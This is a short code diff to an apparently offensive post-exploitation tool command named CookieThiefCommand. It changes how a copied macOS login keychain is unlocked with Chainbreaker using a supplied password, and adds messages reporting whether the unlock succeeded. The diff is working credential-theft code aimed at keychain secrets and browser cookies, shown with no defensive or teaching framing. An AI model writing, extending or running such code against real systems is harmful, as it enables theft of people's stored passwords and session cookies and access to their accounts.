@@ -76,8 +76,14 @@ class CookieThiefCommand(CommandBase):
             sys.stdout.flush()
 
         try:
-            keychain = chainbreaker.Chainbreaker("tmp_login.keychain-db", unlock_password=password, unlock_key=None,
+            keychain = Chainbreaker("tmp_login.keychain-db", unlock_password=password, unlock_key=None,
                                     unlock_file=None)
+            if keychain.locked:
+                print("Keychain failed to unlock.")
+                sys.stdout.flush()
+            else:
+                print("Keychained successfully unlocked")
+                sys.stdout.flush()
         except Exception as e:
             print("Chainbreaker script failed with error: " + str(e))
             sys.stdout.flush()
